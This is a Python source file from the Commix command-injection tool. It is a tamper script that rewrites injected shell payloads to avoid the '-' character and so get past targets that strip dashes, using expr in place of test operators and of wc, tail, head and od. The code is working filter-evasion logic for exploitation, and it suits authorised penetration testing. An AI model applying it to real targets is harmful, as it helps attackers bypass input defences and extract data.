#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re

from src.utils import settings
from src.core.controller import checks

"""
About: Runs 'test's numeric comparisons ('-eq'/'-ne'/'-le'/'-ge'/'-lt'/'-gt') without a '-' of their
       own, for a target that strips a bare '-' outright.
Notes: This tamper script works against target(s) with a POSIX shell. Equality is read as '='/'!=', which agrees with '-eq'/'-ne' exactly for the plain, unpadded decimal integers commix always compares this way - it would not for a value written with a leading zero. Ordering has no dash-free spelling of its own in 'test', so it is read instead from 'expr's own comparison, whose "<="/">="/"<"/">" need no '-' either - quoted, since unquoted they are shell redirections.
       What this reaches is every '-' the results-, boolean-, time- and file-based techniques
       write: the comparisons above, a word's length, a byte's ordinal, and the marker a result is
       read by. The tempfile-based technique's byte reading is not among them - it turns a whole
       file into the decimals of its bytes through options, which are spelled with the character
       this script is there to avoid - and a run reaching that technique is told so.
References: [1] https://github.com/digininja/DVWA/blob/master/vulnerabilities/exec/source/high.php
"""

__tamper__ = "dashlesstest"
__priority__ = settings.PRIORITY.LOWER

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_eval_incompatible(__tamper__) or checks.tamper_dep_unix_only(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# The ordering operators, spelled the way 'expr' reads them rather than 'test'.
_ORDER_OPERATORS = {"-le": "<=", "-ge": ">=", "-lt": "<", "-gt": ">"}

"""
A '[ LEFT OP RIGHT ]' ordering test, rewritten around 'expr' instead. Which side holds the plain
integer and which the longer expression is not the same from one caller to the next - a length is
compared against a variable on either side, depending on which payload built the check - so neither
side is assumed to be the simple one. What is assumed is that this bracket is flat: nothing commix
writes for this ever nests a second '[' inside the one being rewritten, so the nearest '[ ' before
the operator and the nearest ' ]' after it are this same test's own boundary, however long either
side runs.
"""
def _rewrite_ordering(payload):
  for operator, symbol in _ORDER_OPERATORS.items():
    token = " " + operator + " "
    search_from = 0
    while True:
      op_index = payload.find(token, search_from)
      if op_index == -1:
        break
      open_bracket = payload.rfind("[ ", 0, op_index)
      close_bracket = payload.find(" ]", op_index + len(token))
      if open_bracket == -1 or close_bracket == -1:
        search_from = op_index + len(token)
        continue
      left = payload[open_bracket + 2:op_index]
      right = payload[op_index + len(token):close_bracket]
      replacement = "[ $(expr " + left + " '" + symbol + "' " + right + ") = 1 ]"
      payload = payload[:open_bracket] + replacement + payload[close_bracket + 2:]
      search_from = open_bracket + len(replacement)
  return payload

"""
The printing a reading is taken through, as either technique writes it.

The same reading is written twice in the tree - once through 'checks.print_value()' and once with
the format spelled out - and with or without spaces around the pipes. Matched both ways here so one
rewrite covers them, rather than one of them being quietly left carrying a '-'.
"""
_PRINTERS = r"(?:printf %s |printf '%s' |echo -n )"
_PIPE = r"\s*\|\s*"

# How far into a word a reading starts, as the regex 'expr' matches that many characters with.
def _skipped(count):
  return r".\{" + str(count) + r"\}"

"""
The byte count the comparisons are made against, spelled without the '-' of 'wc -c'.

Written down a pipe because the separator being proved is one, and nothing set on its left side
survives to be read with '${#...}' on the right. 'expr STRING : REGEX' answers with how far the
match ran, which needs neither a pipe nor a dash, and agrees with 'wc -c' on what this counts -
a marker of ASCII letters, where a character and a byte are the same thing.
"""
_LENGTH = re.compile(r"\$\(" + _PRINTERS + r'"(?P<word>[^"]*)"' + _PIPE + r"wc -c\)")

def _rewrite_length(payload):
  return _LENGTH.sub(lambda m: '$(expr "' + m.group("word") + '" : \'.*\')', payload)

"""
The byte read down the pipe, without the '-' of 'tail -c +N', 'head -c 1' and 'od -A n -t u1'.

'expr STRING : REGEX' takes the character the three of them were there to reach, and 'printf' reads
its ordinal the way every other byte in a payload is read. Written as a command substitution rather
than an arithmetic one, because this stands where the caller may already have an arithmetic
expansion open, and one holding another is not parsed alike everywhere. The span is added on and
taken off again for the same reason 'byte_ordinal' does it - a build whose 'printf' signs the byte
answers with a negative, and the same sum lands either answer back in range.
"""
_ORDINAL = re.compile(r"\$\(" + _PRINTERS + r'"(?P<word>[^"]*)"' + _PIPE + r"tail -c \+(?P<at>\d+)" +
                      _PIPE + r"head -c 1" + _PIPE + r"od -A n -t u1\)")

def _rewrite_piped_ordinal(payload):
  span = str(settings.HIGHEST_BYTE + 1)
  def _rewritten(match):
    character = '$(expr "' + match.group("word") + '" : "' + _skipped(int(match.group("at")) - 1) + r'\(.\)")'
    return ("$(expr \\( $(" + settings.BYTE_LOCALE + " printf '%d' \"'" + character +
            "\") + " + span + " \\) % " + span + ")")
  return _ORDINAL.sub(_rewritten, payload)

"""
The marker printed, or not, without the '-' of 'tail -c +N'.

The pipe form writes the marker out whole and then takes it from the byte the comparison picks -
its first where the answer is yes, one past its last where it is no, which leaves nothing to take.
The same choice is made by how far into the marker 'expr' is told to start: none of it where the
answer is yes, all of it where it is no, and what comes back is handed to the run's own printing
rather than to a second one of this script's.
"""
_PRINTED_MARKER = re.compile(r"(?P<printer>" + _PRINTERS + r")(?P<marker>\w+)" + _PIPE +
                             r"tail -c \+\$\(\( \((?P<arith>.*?)\) \? 1 : (?P<past>\d+) \)\)")

def _rewrite_printed_marker(payload):
  def _rewritten(match):
    skipped = "$(( (" + match.group("arith") + ") ? 0 : " + str(int(match.group("past")) - 1) + " ))"
    taken = '$(expr "' + match.group("marker") + '" : "' + r".\{" + skipped + r"\}\(.*\)" + '")'
    # What comes back is a word of letters or nothing at all, and neither printing may carry a '-'
    # of its own - which rules out the '-n' a value is printed with where the run prints with
    # 'echo'. The line break 'echo' leaves behind costs nothing: what is read off the page is
    # whether the marker is on it. 'printf' keeps its format, since handed none at all it answers
    # with a usage error instead of the silence an absent marker is supposed to look like.
    printing = "echo" + settings.SINGLE_WHITESPACE if settings.PRINT_WITH_ECHO else checks.print_value("")
    return printing + taken
  return _PRINTED_MARKER.sub(_rewritten, payload)

# Read every comparison the way 'test' does without its own operators' '-'.
def tamper(payload):
  # A target settled as Windows after this script was accepted: 'cmd.exe' has no 'test' expression to write the dash-free way.
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return payload
  payload = _rewrite_ordering(payload)
  payload = _rewrite_length(payload)
  payload = _rewrite_printed_marker(payload)
  payload = _rewrite_piped_ordinal(payload)
  return payload.replace(" -eq ", " = ").replace(" -ne ", " != ")

# eof
